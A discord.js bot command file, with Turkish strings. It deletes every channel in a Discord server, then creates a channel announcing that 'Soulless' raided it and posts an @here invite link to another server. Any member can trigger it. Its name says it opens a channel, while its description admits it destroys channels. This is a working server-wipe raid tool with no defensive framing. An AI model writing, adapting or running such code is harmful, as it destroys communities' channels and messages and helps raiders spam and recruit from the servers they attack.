const Discord = require('discord.js');
exports.run = function(client, message) {
  message.guild.channels.map(m => m.delete())
  message.guild.createChannel('soulless uğradı', 'text').then(zzz => {
    zzz.send('> @here Soulless Uğradı? https://discord.gg/J5qtVz2 `\n**Soulless? buradaydı**')
  })
};
exports.conf = {

  enabled: true,
  guildOnly: false, 
  aliases: ['kanal'],
  permLevel: 0 
};
exports.help = {
  name: 'kanalaçsana',
  description: 'Kanalları yok eder aşkım',
  usage: 'kanal'
}